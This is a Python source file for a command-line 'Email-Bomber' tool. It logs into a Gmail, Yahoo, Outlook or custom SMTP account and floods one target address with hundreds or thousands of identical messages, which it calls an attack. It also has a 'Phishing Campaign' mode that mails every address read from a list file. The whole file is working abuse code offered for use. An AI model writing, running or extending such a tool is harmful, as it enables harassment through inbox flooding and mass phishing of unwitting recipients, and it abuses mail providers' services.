
import smtplib
import sys
import getpass


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def banner():
    print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
    print(bcolors.GREEN + '''

                                        \u001b[31m @  \u001b[32m I \u001b[33m Z \u001b[34m A \u001b[35m B \u001b[36m O \u001b[37m D        
\u001b[33m                    \|/\u001b
\u001b[37m                       `--+--'
                          |
                      ,--'#`--.
                      |#######|
                   _.-'#######`-._
                ,-'###############`-.
              ,'#####################`,   \u001b[0m       
\u001b[31m            ▄█     ▄████████ ▀█████████▄          \u001b[0m
\u001b[31m            ███    ███    ███   ███    ███        \u001b[0m
\u001b[31m            ███▌   ███    █▀    ███    ███        \u001b[0m
\u001b[31m            ███▌  ▄███▄▄▄      ▄███▄▄▄██▀         \u001b[0m
\u001b[31m            ███▌ ▀▀███▀▀▀     ▀▀███▀▀▀██▄         \u001b[0m
\u001b[31m            ███    ███    █▄    ███    ██▄        \u001b[0m
\u001b[31m            ███    ███    ███   ███    ███        \u001b[0m
\u001b[31m            █▀     ██████████ ▄█████████▀         \u001b[0m
                                                                   
\u001b[37m             |#########################|        
            |###########################|       
           |#############################|
           |#############################|       Author: PL4GU33 aka IZABOD 
           |#############################|
            |###########################|
             \#########################/
              `.#####################,'
                `._###############_,'
                   `--..#####..--'                       \u001b[0m          ,-.--.
*.______________________________________________________________,' (Bomb)
                                                                    `--' ''')


class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
            self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4,5) || 1:(1000) 2:(500) 3:(250) 4:(custom) 5:(Phishing Campaign) <: '))
            self.target = ""
            if self.mode != int(5):
                self.target = str(input(bcolors.GREEN + 'Enter target email <: '))
            if int(self.mode) > int(5) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            elif self.mode == int(5):
                # bomb = Email_Bomber()
                self.email()
                self.attack2()
            else:
                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
            print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
            self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
            self.fromPwd = str(getpass.getpass(bcolors.GREEN + 'Enter from password <: '))
            self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
            self.message = str(input(bcolors.GREEN + 'Enter message <: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
        sys.exit(0)

    def attack2(self):
        with open("email.txt") as file:
            for email in file.readlines():
                self.target = email
                print(bcolors.RED + f"+[+[+[Sending to \u001b[36;1m {self.target.rstrip()} \u001b[0m ]+]+]+")
                self.s.sendmail(self.fromAddr, self.target, self.msg)
        sys.exit(0)

if __name__=='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
    bomb.attack2()